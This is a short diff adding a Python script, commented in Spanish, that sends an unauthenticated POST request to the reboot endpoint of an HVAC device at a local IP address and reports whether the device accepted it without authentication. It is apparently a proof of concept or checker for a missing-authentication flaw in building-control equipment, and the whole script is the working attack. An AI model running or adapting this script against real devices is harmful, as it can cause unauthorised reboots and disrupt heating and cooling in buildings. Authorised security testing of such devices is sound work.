@@ -1,0 +1,10 @@
+import requests
+
+# IP del dispositivo HVAC
+url = "http://192.168.0.200/api/system/reboot"
+resp = requests.post(url)
+
+if resp.status_code == 200:
+    print("[+] Ejecución exitosa sin autenticación")
+else:
+    print("[-] Parece protegido o no vulnerable")
